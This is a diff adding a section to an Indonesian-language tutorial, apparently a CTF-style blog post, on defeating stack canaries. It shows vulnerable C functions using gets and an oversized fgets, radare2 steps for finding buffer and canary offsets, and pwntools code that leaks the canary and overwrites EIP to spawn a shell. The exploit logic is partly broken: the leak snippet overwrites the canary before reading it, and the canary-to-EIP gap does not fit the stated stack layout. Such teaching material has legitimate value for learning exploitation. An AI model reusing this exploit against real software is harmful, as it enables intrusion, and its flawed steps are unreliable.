@@ -281,7 +281,169 @@ Kesimpulan:">
 <li><strong>64-bit canary</strong> = 8 byte (7 byte ditebak, 1 byte null).</li>
 <li><strong>Setelah dapat canary</strong>, lanjutkan dengan <strong>ROP/Ret2Libc</strong> untuk bypass NX.</li>
 </ul>
-<p>Dengan memahami <strong>bit, byte, dan nilai 256</strong>, kita bisa melakukan <strong>brute-force canary</strong> untuk mengeksploitasi <strong>buffer overflow</strong>! 🚀</p>
+<h1 id="func-vulnerability">Func vulnerability</h1>
+<p>Canary biasanya terlibat ketika ada fungsi <strong>tidak aman</strong> yang membaca input user, seperti:</p>
+<table>
+  <thead>
+      <tr>
+          <th>Fungsi</th>
+          <th>Deskripsi Risiko</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>gets</code></td>
+          <td><strong>Paling berbahaya</strong>, tidak batasi input.</td>
+      </tr>
+      <tr>
+          <td><code>scanf</code></td>
+          <td>Bisa overflow jika format <code>%s</code> tanpa batas.</td>
+      </tr>
+      <tr>
+          <td><code>strcpy</code></td>
+          <td>Menyalin string tanpa cek panjang.</td>
+      </tr>
+      <tr>
+          <td><code>fgets</code></td>
+          <td><strong>Lebih aman</strong>, tapi bisa tetap overflow jika ukuran buffer salah.</td>
+      </tr>
+      <tr>
+          <td><code>read</code></td>
+          <td>Bisa overflow jika <code>read(fd, buf, size)</code> dengan <code>size</code> terlalu besar.</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="contoh-fungsi-vulnerable"><strong>Contoh Fungsi Vulnerable</strong></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#0f0">// Contoh 1: gets() (paling mudah di-exploit)
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span><span style="color:#ee82ee">void</span> <span style="color:#ff0">vuln</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#ee82ee">char</span> buf[<span style="color:#f60">80</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#ff0">gets</span>(buf);  <span style="color:#0f0">// Bisa overflow!
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0">// Contoh 2: fgets() dengan ukuran salah
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span><span style="color:#ee82ee">void</span> <span style="color:#ff0">vuln2</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#ee82ee">char</span> buf[<span style="color:#f60">80</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#ff0">fgets</span>(buf, <span style="color:#f60">200</span>, stdin);  <span style="color:#0f0">// Overflow karena size &gt; kapasitas buf
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>}
+</span></span></code></pre></div><hr>
+<h2 id="menemukan-posisi-canary-di-stack">Menemukan Posisi Canary di Stack</h2>
+<p>Kita akan menggunakan <strong>radare2</strong> untuk menganalisis binary.</p>
+<h3 id="langkah-1-buka-binary-di-r2"><strong>Langkah 1: Buka Binary di r2</strong></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>r2 -d ./binary32   <span style="color:#0f0"># Debug binary 32-bit</span>
+</span></span><span style="display:flex;"><span>aaa                <span style="color:#0f0"># Analisis semua simbol</span>
+</span></span><span style="display:flex;"><span>afl                <span style="color:#0f0"># Lihat daftar fungsi</span>
+</span></span></code></pre></div><h3 id="langkah-2-cari-fungsi-yang-rentan"><strong>Langkah 2: Cari Fungsi yang Rentan</strong></h3>
+<p>Cari fungsi yang memanggil <code>gets</code>, <code>fgets</code>, atau <code>scanf</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>s sym.vuln         <span style="color:#0f0"># Pindah ke fungsi vuln</span>
+</span></span><span style="display:flex;"><span>pdf                <span style="color:#0f0"># Disassemble fungsi</span>
+</span></span></code></pre></div><h3 id="langkah-3-identifikasi-buffer-dan-canary"><strong>Langkah 3: Identifikasi Buffer dan Canary</strong></h3>
+<h4 id="a-cari-alokasi-buffer"><strong>a. Cari Alokasi Buffer</strong></h4>
+<p>Lihat instruksi <code>sub esp, X</code> (X = ukuran buffer):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#ff0">sub</span> <span style="color:#7fffd4">esp</span>, <span style="color:#f60">0x54</span>      <span style="color:#0f0">; Alokasi 84 byte (0x54) di stack
+</span></span></span></code></pre></div><h4 id="b-cari-penyimpanan-canary"><strong>b. Cari Penyimpanan Canary</strong></h4>
+<p>Canary biasanya di-load dari <code>gs:0x14</code> (32-bit) atau <code>fs:0x28</code> (64-bit):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#ff0">mov</span> <span style="color:#7fffd4">eax</span>, <span style="color:#7fffd4">gs</span>:<span style="color:#f60">0x14</span>    <span style="color:#0f0">; Load Canary
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span><span style="color:#ff0">mov</span> [<span style="color:#7fffd4">ebp-0xc</span>], <span style="color:#7fffd4">eax</span>  <span style="color:#0f0">; Simpan Canary di stack (posisi ebp-0xc)
+</span></span></span></code></pre></div><h4 id="c-cari-awal-buffer"><strong>c. Cari Awal Buffer</strong></h4>
+<p>Buffer biasanya diakses via <code>lea</code> (Load Effective Address):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#ff0">lea</span> <span style="color:#7fffd4">eax</span>, [<span style="color:#7fffd4">ebp-0x50</span>] <span style="color:#0f0">; Buffer mulai di ebp-0x50
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span><span style="color:#ff0">push</span> <span style="color:#7fffd4">eax</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff0">call</span> <span style="color:#7fffd4">sym.imp.gets</span>   <span style="color:#0f0">; Overflow di sini
+</span></span></span></code></pre></div><hr>
+<h2 id="4-hitung-offset-buffer-ke-canary"><strong>4. Hitung Offset Buffer ke Canary</strong></h2>
+<p>Dari contoh di atas:</p>
+<ul>
+<li><strong>Buffer</strong> dimulai di <code>[ebp-0x50]</code> (80 byte dari <code>ebp</code>).</li>
+<li><strong>Canary</strong> disimpan di <code>[ebp-0xc]</code> (12 byte dari <code>ebp</code>).</li>
+</ul>
+<p><strong>Rumus Offset</strong>:</p>
+<pre tabindex="0"><code>offset_ke_canary = (pos_buffer - pos_canary)  
+                = (0x50 - 0xc)  
+                = 0x44 (68 dalam desimal)
+</code></pre><hr>
+<h2 id="5-verifikasi-dengan-radare2"><strong>5. Verifikasi dengan radare2</strong></h2>
+<h3 id="a-set-breakpoint-dan-jalankan"><strong>a. Set Breakpoint dan Jalankan</strong></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>db sym.vuln    <span style="color:#0f0"># Set breakpoint di fungsi vuln</span>
+</span></span><span style="display:flex;"><span>dc            <span style="color:#0f0"># Jalankan program</span>
+</span></span></code></pre></div><h3 id="b-periksa-nilai-canary"><strong>b. Periksa Nilai Canary</strong></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>px @ ebp-0xc   <span style="color:#0f0"># Lihat nilai Canary</span>
+</span></span></code></pre></div><p>Contoh output:</p>
+<pre tabindex="0"><code>[0xffffd10c]  0x1a2b3c00  0x00000000
+</code></pre><p>Canary = <code>0x1a2b3c00</code>.</p>
+<h3 id="c-periksa-buffer"><strong>c. Periksa Buffer</strong></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>px @ ebp-0x50  <span style="color:#0f0"># Lihat isi buffer</span>
+</span></span></code></pre></div><hr>
+<h2 id="6-eksploitasi-dengan-python-pwntools"><strong>6. Eksploitasi dengan Python (pwntools)</strong></h2>
+<h3 id="a-leak-canary-jika-diperlukan"><strong>a. Leak Canary (jika diperlukan)</strong></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p = process(<span style="color:#87ceeb">&#34;./binary32&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Kirim payload sampai Canary</span>
+</span></span><span style="display:flex;"><span>payload = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;A&#34;</span> * <span style="color:#f60">68</span>           <span style="color:#0f0"># Offset ke Canary</span>
+</span></span><span style="display:flex;"><span>p.send(payload + <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;BBBB&#34;</span>)     <span style="color:#0f0"># Timpa Canary</span>
+</span></span><span style="display:flex;"><span>p.recvuntil(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;BBBB&#34;</span>)          <span style="color:#0f0"># Baca respons</span>
+</span></span><span style="display:flex;"><span>canary = u32(p.recv(<span style="color:#f60">4</span>))       <span style="color:#0f0"># Ambil Canary</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;Canary: </span><span style="color:#87ceeb">{</span>hex(canary)<span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#34;</span>)
+</span></span></code></pre></div><h3 id="b-timpa-eip-dengan-canary-yang-benar"><strong>b. Timpa EIP dengan Canary yang Benar</strong></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload = (
+</span></span><span style="display:flex;"><span>    <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;A&#34;</span> * <span style="color:#f60">68</span> +              <span style="color:#0f0"># Isi buffer</span>
+</span></span><span style="display:flex;"><span>    p32(canary) +            <span style="color:#0f0"># Canary asli</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;B&#34;</span> * <span style="color:#f60">8</span> +               <span style="color:#0f0"># Jarak Canary ke EIP</span>
+</span></span><span style="display:flex;"><span>    p32(<span style="color:#f60">0x080491d6</span>)          <span style="color:#0f0"># Alamat return (ganti dengan target)</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>p.sendline(payload)
+</span></span><span style="display:flex;"><span>p.interactive()  <span style="color:#0f0"># Dapatkan shell/flag</span>
+</span></span></code></pre></div><hr>
+<h2 id="7-kasus-khusus-binary-dengan"><strong>7. Kasus Khusus: Binary dengan <code>fgets</code></strong></h2>
+<p>Jika binary menggunakan <code>fgets</code>, pastikan:</p>
+<ol>
+<li><strong>Ukuran buffer benar</strong>:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff0">fgets</span>(buf, <span style="color:#f60">80</span>, stdin);  <span style="color:#0f0">// Aman jika ukuran &lt;= kapasitas buf
+</span></span></span></code></pre></div></li>
+<li><strong>Jika ada overflow</strong>, berarti ada kesalahan ukuran:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff0">fgets</span>(buf, <span style="color:#f60">200</span>, stdin);  <span style="color:#0f0">// Overflow jika buf hanya 80 byte
+</span></span></span></code></pre></div></li>
+</ol>
+<hr>
+<h2 id="8-kesimpulan"><strong>8. Kesimpulan</strong></h2>
+<table>
+  <thead>
+      <tr>
+          <th>Langkah</th>
+          <th>Tool/Command</th>
+          <th>Deskripsi</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>Cari fungsi rentan</strong></td>
+          <td><code>r2 -d binary</code>, <code>pdf</code></td>
+          <td>Analisis fungsi di radare2</td>
+      </tr>
+      <tr>
+          <td><strong>Hitung offset</strong></td>
+          <td><code>ebp-0x50 - ebp-0xc</code></td>
+          <td>Buffer ke Canary = 68 byte</td>
+      </tr>
+      <tr>
+          <td><strong>Leak Canary</strong></td>
+          <td><code>px @ ebp-0xc</code></td>
+          <td>Baca nilai Canary</td>
+      </tr>
+      <tr>
+          <td><strong>Eksploitasi</strong></td>
+          <td>Python + pwntools</td>
+          <td>Timpa EIP dengan Canary benar</td>
+      </tr>
+  </tbody>
+</table>
+<p>Dengan langkah-langkah ini, Anda bisa <strong>menemukan Canary</strong> dan <strong>mengeksploitasi buffer overflow</strong> meskipun proteksi Canary aktif.</p>
+<p><strong>Tips</strong>:</p>
+<ul>
+<li>Selalu verifikasi dengan <code>checksec</code> apakah Canary aktif.</li>
+<li>Jika binary menggunakan <code>fgets</code>, pastikan ada kesalahan ukuran buffer.</li>
+</ul>
 
 </article>
 
